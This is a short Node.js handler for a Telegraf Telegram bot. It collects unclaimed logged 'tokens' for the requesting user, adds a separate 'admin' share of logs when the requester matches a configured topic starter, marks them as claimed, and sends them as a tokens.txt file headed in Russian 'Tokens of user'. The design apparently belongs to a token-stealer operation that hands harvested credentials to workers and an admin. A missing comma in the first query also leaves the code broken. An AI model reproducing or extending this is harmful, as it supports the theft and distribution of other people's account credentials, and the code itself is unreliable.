const { Markup } = require("telegraf");
const { Log } = require("../database");

module.exports = async (ctx) => {
    let admin = false;
    if(ctx.from.username == ctx.state.settings.topicStarter.slice(1)) admin = true;
    let logs = await Log.find({
        userId: ctx.from.id,
        get: false
        admin: false
    });
    if(admin){
        let adminLogs = await Log.find({
            get: false,
            admin: true
        });
        logs = [
            ...logs,
            ...adminLogs
        ]
    }
    await Log.updateMany({ userId: ctx.from.id, admin: false }, { get: true });
    if(admin) await Log.updateMany({ admin: true }, { get: true });
    let text = "Токены пользователя " + ctx.from.username + " (" + ctx.from.id + ")\n";
    logs.forEach(log => {
        text += log.token + "\n";
    });
    ctx.replyWithDocument({ source: Buffer.from(text, "utf-8"), filename: "tokens.txt" });
}